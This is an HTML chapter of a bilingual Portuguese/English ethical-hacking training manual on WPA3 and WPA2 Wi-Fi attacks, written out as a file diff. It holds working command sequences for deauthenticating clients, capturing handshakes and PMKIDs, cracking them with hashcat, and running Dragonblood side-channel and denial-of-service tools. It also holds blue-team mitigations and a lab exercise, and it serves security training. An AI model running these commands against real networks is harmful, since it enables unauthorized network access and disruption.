@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 33 — Wireless/WPA3 | Ch. 33</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent2);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent2)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent2)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.info{border-left-color:var(--accent2);background:rgba(88,166,255,.08)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 33 — Wireless/WPA3</h1>
+<div class="sub">Ch. 33 — Realidade do WPA3, Transition Mode e Dragonblood</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>📡 Nível: Wireless / Avançado</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#reality">Realidade do WPA3</a></li>
+<li><a href="#transition">Transition Mode</a></li><li><a href="#dragonblood">Dragonblood</a></li>
+<li><a href="#wacker">Ataque Online</a></li><li><a href="#wpa2">WPA2 Clássico</a></li>
+<li><a href="#impact">Scripts de Impacto</a></li><li><a href="#mitre">MITRE</a></li>
+<li><a href="#mitig">Mitigações</a></li><li><a href="#lab">Laboratório</a></li>
+<li><a href="#revq">Revisão</a></li><li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+
+<section id="obj">
+<h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+<div class="lang">
+<span class="pt">Compreender porque o WPA3-SAE não é crackável offline; identificar Transition Mode e executar downgrade para WPA2; conhecer o Dragonblood (side-channel e downgrade de grupo); usar Wacker para ataques online; aplicar o fluxo WPA2 clássico (handshake + PMKID + Hashcat); <strong>construir scripts de impacto nativos</strong> para deteção e validação.</span>
+<span class="en">Understand why WPA3-SAE is not offline-crackable; identify Transition Mode and execute downgrade to WPA2; know Dragonblood (side-channel and group downgrade); use Wacker for online attacks; apply the classic WPA2 flow (handshake + PMKID + Hashcat); <strong>build native impact scripts</strong> for detection and validation.</span>
+</div>
+</section>
+
+<section id="reality">
+<h2>2. Realidade do WPA3 <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">O WPA3-Personal substituiu o handshake PSK do WPA2 pelo <strong>SAE (Simultaneous Authentication of Equals)</strong>, também chamado Dragonfly. O SAE é um protocolo <strong>online-only</strong>: não há PMKID nem hash de handshake de 4 vias para crackear offline. Cada tentativa de autenticação exige interação em tempo real com o AP.</span>
+<span class="en">WPA3-Personal replaced WPA2's PSK handshake with <strong>SAE (Simultaneous Authentication of Equals)</strong>, also called Dragonfly. SAE is an <strong>online-only</strong> protocol: there is no PMKID or 4-way handshake hash to crack offline. Each authentication attempt requires real-time interaction with the AP.</span>
+</div>
+<div class="callout danger">
+<strong>⚠️ Não há magia / No magic:</strong>
+<div class="lang">
+<span class="pt">Não existe um "modo Hashcat" para WPA3-SAE. Se um AP estiver em <strong>WPA3-SAE puro</strong> (sem Transition Mode), a captura passiva não te dá nada crackável offline. As opções realistas são: (1) atacar o <strong>Transition Mode</strong> (downgrade para WPA2), (2) explorar <strong>Dragonblood</strong> (se o firmware for antigo), ou (3) fazer um <strong>ataque online</strong> (Wacker, lento e ruidoso).</span>
+<span class="en">There is no Hashcat mode for WPA3-SAE. If an AP is in <strong>pure WPA3-SAE</strong> (no Transition Mode), passive capture gives you nothing offline-crackable. Realistic options are: (1) attack <strong>Transition Mode</strong> (downgrade to WPA2), (2) exploit <strong>Dragonblood</strong> (if firmware is old), or (3) perform an <strong>online attack</strong> (Wacker, slow and noisy).</span>
+</div>
+</div>
+</section>
+
+<section id="transition">
+<h2>3. Transition Mode — Downgrade para WPA2 <span class="badge orig">Original</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">A maioria dos APs com WPA3 corre em <strong>Transition Mode</strong>: anunciam WPA3-SAE e WPA2-PSK no mesmo SSID, com a mesma password, para compatibilidade com dispositivos antigos. Isto preserva a superfície de ataque do WPA2.</span>
+<span class="en">Most WPA3-capable APs run in <strong>Transition Mode</strong>: they advertise WPA3-SAE and WPA2-PSK on the same SSID, with the same passphrase, for legacy device compatibility. This preserves the WPA2 attack surface.</span>
+</div>
+<h3>3.1 Identificar Transition Mode / Identify Transition Mode</h3>
+<pre># A coluna ENC mostra "WPA2 WPA3" ou "SAE PSK"
+sudo airodump-ng wlan0mon
+
+# Decodificar RSN capabilities (MFPC/MFPR)
+tshark -r capture.pcap -Y "wlan.fc.type_subtype == 8" -T fields -e wlan.ssid -e wlan_mgt.rsn.capabilities.mfpc -e wlan_mgt.rsn.capabilities.mfpr</pre>
+<div class="lang">
+<span class="pt">Se <code class="inline">MFPC=1, MFPR=0</code>, o PMF é opcional e o downgrade é viável. Se <code class="inline">MFPR=1</code>, o PMF é obrigatório e o downgrade é bloqueado.</span>
+<span class="en">If <code class="inline">MFPC=1, MFPR=0</code>, PMF is optional and downgrade is viable. If <code class="inline">MFPR=1</code>, PMF is required and downgrade is blocked.</span>
+</div>
+<h3>3.2 Executar Downgrade / Execute Downgrade</h3>
+<pre># 1. Desautenticar um cliente (forçar reconexão)
+sudo aireplay-ng --deauth 3 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
+
+# 2. Capturar o handshake WPA2 quando o cliente reconecta
+sudo airodump-ng -c <CH> --bssid <AP_MAC> wlan0mon -w wpa3_transition
+
+# 3. Converter para Hashcat
+hcxpcapngtool -o hash.hc22000 wpa3_transition*.cap
+
+# 4. Crackear offline
+hashcat -m 22000 hash.hc22000 rockyou.txt</pre>
+<div class="lang">
+<span class="pt">Alternativa mais furtiva: montar um <strong>Rogue AP</strong> que anuncia apenas WPA2 com o mesmo SSID. O cliente reconecta-se a ele (por sinal mais forte ou deauth) e completa o handshake WPA2, que capturas.</span>
+<span class="en">Stealthier alternative: set up a <strong>Rogue AP</strong> advertising only WPA2 with the same SSID. The client reconnects to it (stronger signal or deauth) and completes the WPA2 handshake, which you capture.</span>
+</div>
+</section>
+
+<section id="dragonblood">
+<h2>4. Dragonblood <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">O Dragonblood (Mathy Vanhoef e Eyal Ronen, 2019) é uma família de falhas no SAE: <strong>side-channels de cache/timing</strong> (CVE-2019-9494, CVE-2019-9495) que permitem um ataque de partição de password offline, <strong>downgrade de grupo SAE</strong> (forçar um grupo criptográfico mais fraco), e <strong>DoS</strong> contra o anti-clogging do AP (CVE-2019-9496).</span>
+<span class="en">Dragonblood (Mathy Vanhoef and Eyal Ronen, 2019) is a family of SAE flaws: <strong>cache/timing side-channels</strong> (CVE-2019-9494, CVE-2019-9495) enabling an offline password-partitioning attack, <strong>SAE group downgrade</strong> (forcing a weaker crypto group), and <strong>DoS</strong> against the AP's anti-clogging (CVE-2019-9496).</span>
+</div>
+<div class="callout info">
+<strong>Estado prático / Practical status:</strong>
+<div class="lang">
+<span class="pt">O Dragonblood foi <strong>amplamente patcheado</strong> (hostapd/wpa_supplicant 2.10, Abril 2022; iOS/macOS 2019; Windows 2019-2020). Só funciona em firmwares antigos ou routers SOHO não atualizados. O valor principal hoje é <strong>documentar a vulnerabilidade</strong>, não recuperar a password.</span>
+<span class="en">Dragonblood was <strong>widely patched</strong> (hostapd/wpa_supplicant 2.10, April 2022; iOS/macOS 2019; Windows 2019-2020). It only works on old firmware or unpatched SOHO routers. Its main value today is <strong>documenting the vulnerability</strong>, not recovering the password.</span>
+</div>
+</div>
+<pre># Ferramentas de pesquisa (Vanhoef)
+git clone https://github.com/vanhoefm/dragonblood
+cd dragonblood
+
+# Side-channel de timing
+python3 dragontime.py --bssid AA:BB:CC:DD:EE:FF --iface wlan0mon --mode timing
+
+# DoS contra anti-clogging (dragondrain)
+python3 dragondrain.py wlan0mon AA:BB:CC:DD:EE:FF</pre>
+</section>
+
+<section id="wacker">
+<h2>5. Ataque Online (Wacker) <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Como o SAE exige interação por tentativa, ataques de dicionário <strong>online</strong> ainda são possíveis se a password for fraca. O <strong>Wacker</strong> faz isto, mas é lento e ruidoso (cada tentativa é uma autenticação real). Um estudo IEEE de 2026 confirma que o WPA3 é mais resistente a offline, mas continua vulnerável a passwords fracas via ataques online.</span>
+<span class="en">Because SAE requires interaction per attempt, <strong>online</strong> dictionary attacks are still possible if the password is weak. <strong>Wacker</strong> does this, but it's slow and noisy (each attempt is a real authentication). A 2026 IEEE study confirms WPA3 is more resistant to offline attacks but remains vulnerable to weak passwords via online attacks.</span>
+</div>
+<pre># Wacker (ferramenta de pesquisa)
+# Requer interação real com o AP; lento e detetável
+# Usar apenas em laboratório com autorização</pre>
+</section>
+
+<section id="wpa2">
+<h2>6. WPA2 Clássico — Handshake e PMKID <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Se o alvo for WPA2 (ou Transition Mode), o fluxo clássico continua a funcionar. O <strong>PMKID attack</strong> é clientless: um único frame EAPOL do AP pode conter um hash crackável, sem precisar de cliente ligado ou deauth.</span>
+<span class="en">If the target is WPA2 (or Transition Mode), the classic flow still works. The <strong>PMKID attack</strong> is clientless: a single EAPOL frame from the AP can contain a crackable hash, without needing a connected client or deauth.</span>
+</div>
+<pre># Capturar PMKID (clientless)
+sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
+
+# Converter para Hashcat
+hcxpcapngtool -o hash.hc22000 capture.pcapng
+
+# Crackear
+hashcat -m 22000 hash.hc22000 rockyou.txt</pre>
+<div class="lang">
+<span class="pt">O <strong>Wifite3</strong> automatiza isto: deteta WPA3/Transition Mode, captura handshakes e PMKID, e converte para formato 22000.</span>
+<span class="en"><strong>Wifite3</strong> automates this: detects WPA3/Transition Mode, captures handshakes and PMKID, and converts to 22000 format.</span>
+</div>
+</section>
+
+<section id="impact">
+<h2>7. Scripts de Impacto / Impact Scripts <span class="badge impact">Impacto</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Os scripts abaixo ajudam a validar a configuração wireless e a documentar a postura de segurança.</span>
+<span class="en">The scripts below help validate wireless configuration and document security posture.</span>
+</div>
+
+<h3>7.1 Script 33.1 — Análise de Configuração WPA3 / WPA3 Configuration Analysis</h3>
+<pre># Script 33.1 - WPA3 Configuration Analysis (Kali/Linux)
+#!/bin/bash
+# Requer airodump-ng e tshark
+IFACE=${1:-wlan0mon}
+echo "[*] Scanning for WPA3 / Transition Mode..."
+sudo airodump-ng --output-format csv -w /tmp/wpa3_scan $IFACE &
+sleep 15
+kill %1 2>/dev/null
+echo "[*] Analyzing RSN capabilities..."
+tshark -r /tmp/wpa3_scan-01.cap -Y "wlan.fc.type_subtype == 8" \
+  -T fields -e wlan.ssid -e wlan_mgt.rsn.capabilities.mfpc -e wlan_mgt.rsn.capabilities.mfpr 2>/dev/null | \
+  awk -F'\t' 'NF>=3 {print "SSID: "$1" | MFPC: "$2" | MFPR: "$3"}'</pre>
+
+<h3>7.2 Script 33.2 — Verificação de Firmware para Dragonblood / Dragonblood Firmware Check</h3>
+<pre># Script 33.2 - Dragonblood Firmware Check (heuristic, Linux)
+#!/bin/bash
+# Verifica versão do hostapd/wpa_supplicant local (para labs)
+HOSTAPD_VER=$(hostapd -v 2>&1 | grep -oP 'v[0-9]+\.[0-9]+' | head -1)
+WPA_VER=$(wpa_supplicant -v 2>&1 | grep -oP 'v[0-9]+\.[0-9]+' | head -1)
+echo "hostapd: $HOSTAPD_VER"
+echo "wpa_supplicant: $WPA_VER"
+echo "[!] Dragonblood patched in hostapd/wpa_supplicant >= 2.10 (April 2022)"
+echo "[!] If target firmware is older, Dragonblood may be applicable"</pre>
+
+<h3>7.3 Script 33.3 — Manifesto de Evidências Wireless / Wireless Evidence Manifest</h3>
+<pre># Script 33.3 - Wireless Evidence Manifest
+param([string]$CaptureDir = ".")
+$out = Join-Path $CaptureDir "wireless-manifest.csv"
+$results = @()
+Get-ChildItem $CaptureDir -Include *.pcap,*.pcapng,*.cap,*.hc22000 -File -EA SilentlyContinue | ForEach-Object {
+  $results += [PSCustomObject]@{
+    File = $_.Name
+    Size = $_.Length
+    SHA256 = (Get-FileHash $_.FullName -Algorithm SHA256).Hash
+    LastWrite = $_.LastWriteTime
+  }
+}
+$results | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Manifest: $out ($($results.Count) files)" -ForegroundColor Green</pre>
+</section>
+
+<section id="mitre">
+<h2>8. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar</span></h2>
+<table>
+<tr><th>Técnica</th><th>ID</th><th>Onde</th></tr>
+<tr><td>Adversary-in-the-Middle: Evil Twin</td><td>T1557.004</td><td>Transition Mode downgrade </td></tr>
+<tr><td>Brute Force: Password Guessing</td><td>T1110.001</td><td>Wacker (online) </td></tr>
+<tr><td>Brute Force: Password Cracking</td><td>T1110.002</td><td>Hashcat (WPA2/PMKID) </td></tr>
+<tr><td>Network Sniffing</td><td>T1040</td><td>Captura de handshake/PMKID </td></tr>
+</table>
+</section>
+
+<section id="mitig">
+<h2>9. Mitigações Blue Team / Mitigations <span class="badge comp">Complementar</span></h2>
+<ol>
+<li><strong>Desativar Transition Mode</strong> — WPA3-only elimina o downgrade.</li>
+<li><strong>Ativar PMF obrigatório (MFPR=1)</strong> — bloqueia deauth forjado.</li>
+<li><strong>Atualizar firmware</strong> — patches Dragonblood em hostapd/wpa_supplicant 2.10+.</li>
+<li><strong>Passwords longas e aleatórias</strong> — mitiga Wacker (online).</li>
+<li><strong>WPA3-Enterprise com EAP-TLS</strong> — imune a Evil Twin (validação de certificado).</li>
+<li><strong>Monitorizar Rogue APs</strong> — WIDS/WIPS para SSIDs duplicados.</li>
+<li><strong>Desativar WPS</strong> — evita Pixie Dust.</li>
+</ol>
+</section>
+
+<section id="lab">
+<h2>10. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt"><strong>Cenário:</strong> AP de laboratório configurado em Transition Mode (WPA2/WPA3) com password fraca. Kali com adaptador em modo monitor. Snapshot antes. <strong>Objetivo:</strong> identificar Transition Mode, executar downgrade, capturar handshake e crackear.</span>
+<span class="en"><strong>Scenario:</strong> Lab AP configured in Transition Mode (WPA2/WPA3) with a weak password. Kali with monitor-mode adapter. Snapshot before. <strong>Goal:</strong> identify Transition Mode, execute downgrade, capture handshake, and crack.</span>
+</div>
+<table>
+<tr><th>#</th><th>Tarefa</th><th>Comando</th><th>Evidência</th></tr>
+<tr><td>1</td><td>Scan</td><td><code class="inline">sudo airodump-ng wlan0mon</code></td><td>ENC column</td></tr>
+<tr><td>2</td><td>Verificar PMF</td><td><code class="inline">tshark ... mfpc mfpr</code></td><td>Output</td></tr>
+<tr><td>3</td><td>Deauth</td><td><code class="inline">aireplay-ng --deauth 3 -a AP -c CLIENT</code></td><td>Output</td></tr>
+<tr><td>4</td><td>Capturar</td><td><code class="inline">airodump-ng -w capture ...</code></td><td><code class="inline">.cap</code></td></tr>
+<tr><td>5</td><td>Converter</td><td><code class="inline">hcxpcapngtool -o hash.hc22000 capture.cap</code></td><td><code class="inline">.hc22000</code></td></tr>
+<tr><td>6</td><td>Crackear</td><td><code class="inline">hashcat -m 22000 hash.hc22000 rockyou.txt</code></td><td>Password</td></tr>
+<tr><td>7</td><td>Manifesto</td><td><code class="inline">.\wireless-manifest.ps1</code></td><td><code class="inline">wireless-manifest.csv</code></td></tr>
+</table>
+<h3>Checklist de evidências / Evidence checklist</h3>
+<ul class="checklist">
+<li>Snapshot inicial</li>
+<li>Output do scan (ENC)</li>
+<li>Output PMF (MFPC/MFPR)</li>
+<li><code class="inline">.cap</code> e <code class="inline">.hc22000</code></li>
+<li>Password recuperada (se aplicável)</li>
+<li><code class="inline">wireless-manifest.csv</code></li>
+<li>Snapshot final</li>
+</ul>
+</section>
+
+<section id="revq">
+<h2>11. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar</span></h2>
+<ol>
+<li>Porque é que o WPA3-SAE não é crackável offline? / Why is WPA3-SAE not offline-crackable?</li>
+<li>O que é Transition Mode e porque preserva o risco? / What is Transition Mode and why does it preserve risk?</li>
+<li>Como se identifica Transition Mode no airodump? / How to identify Transition Mode in airodump?</li>
+<li>O que significa MFPR=1? / What does MFPR=1 mean?</li>
+<li>O que é o Dragonblood e qual o seu estado atual? / What is Dragonblood and its current status?</li>
+<li>Porque é que o Wacker é lento? / Why is Wacker slow?</li>
+<li>Como se mitiga o risco de Transition Mode? / How to mitigate Transition Mode risk?</li>
+</ol>
+</section>
+
+<section id="sum">
+<h2>12. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo cobriu a realidade do WPA3: o SAE é online-only e não há crack offline de WPA3-SAE puro. O que funciona é o <strong>Transition Mode</strong> (downgrade para WPA2 via deauth ou Rogue AP, captura de handshake/PMKID, Hashcat 22000) e, em firmwares antigos, o <strong>Dragonblood</strong> (side-channel/timing, amplamente patcheado desde 2022). O <strong>Wacker</strong> permite ataques online, mas é lento e ruidoso. O <strong>WPA2 clássico</strong> (PMKID clientless + Hashcat) continua a ser o fluxo mais fiável. Acrescentámos <strong>três scripts de impacto</strong> (análise de configuração WPA3, verificação de firmware, manifesto de evidências) que ajudam a documentar a postura wireless. Este é o último capítulo do manual.</span>
+<span class="en">This chapter covered WPA3 reality: SAE is online-only and there is no offline crack of pure WPA3-SAE. What works is <strong>Transition Mode</strong> (downgrade to WPA2 via deauth or Rogue AP, handshake/PMKID capture, Hashcat 22000) and, on old firmware, <strong>Dragonblood</strong> (side-channel/timing, widely patched since 2022). <strong>Wacker</strong> enables online attacks, but it's slow and noisy. <strong>Classic WPA2</strong> (clientless PMKID + Hashcat) remains the most reliable flow. We added <strong>three impact scripts</strong> (WPA3 config analysis, firmware check, evidence manifest) that help document wireless posture. This is the final chapter of the manual.</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 33 / Ethical Hacker Training Manual — Ch. 33</div>
+<div style="margin-top:.6rem">
+<a href="cap32.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="#">Fim / End →</a>
+</div>
+</footer>
+</body>
+</html>
